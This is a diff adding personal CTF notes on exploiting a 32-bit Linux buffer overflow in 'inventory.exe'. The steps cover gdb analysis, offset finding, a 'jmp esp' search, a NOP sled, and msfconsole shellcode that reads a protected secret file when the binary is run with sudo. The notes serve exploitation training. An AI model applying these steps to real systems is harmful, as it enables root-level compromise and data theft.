@@ -256,12 +256,70 @@ start from top of heap to end of heap (0xff,-xe4 to find jump)
 create a nop sled
 create a payload with command whoami and generate a hexdump and copy onto script (generate -b "\x00" -f python)
 
+# STEPS from ctf better notes
+file inventory.exe
+inventory.exe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98cdca25964ed9ea71a1f94cb75d6fa9d93cb42d, not stripped
 
+strings inventory.exe
 
+disass main
 
+disass getTheGoods (follow on functions)
 
+pdisass getTheGoods(show deprecated commands)
 
+look for buffer within input and find buffer first sub and esp (sub esp,0xc)
 
+test program by seeinig if its suceptible to buffer overflow and then get an accurate count of how many chars are needed to break it
+
+create first part of python script
+buffer = "A" * 75
+print(buffer)
+(explanation)[once buffer was confirmed make a buffer in script as above and print it]
+
+run <<< $(python ctflin.py)
+
+env - gdb inventory.exe (load env gdb)
+
+show env
+
+unset env <variable>
+
+info proc map (to show address spaces and locate start and end of heap)
+0xf7def000(start of heap)	0xf7ffe000(end of heap)	0xff	0xe4(jump esp)
+(cmd to run)find /b 0xf7def000, 0xf7ffe000, 0xff, 0xe4
+results are a lot of mem addresses copy and paste first 3 onto script
+0xf7df1b51
+0xf7f6674b
+0xf7f72753
+
+add eip = "BBBB" to script
+run and ensure eip becomes all BBBB
+
+add nop sled to script
+nop = '\x90' * 15
+
+use msfconsole
+
+use payload/linux/x86/exec		(bc its a linux 32bit system)
+
+set cmd whoami
+
+generate -b "\x00" -f python (get shellcode and throw into script)
+
+bottom of script should be
+1st	print(buffer)
+2nd	print(buffer + eip)
+3rd	print(buffer + eip + nop + buf)
+
+set cmd to cat  /.secret/.verysecret.pdb
+
+generate -b "\x00" -f python
+
+replace old shellcode with new shellcode
+
+run on cmd not dbg sudo ./inventory.exe <<< $(python /home/comrade/ctflin.py)
+(inventory.exe can be ran as sudo to invike root perms and your using a running prgram iot have a buffer to overflow and that overflow will take advantage of root perms and rum cmd cat /.secret/.veryseceret.pdb)
 
 
 
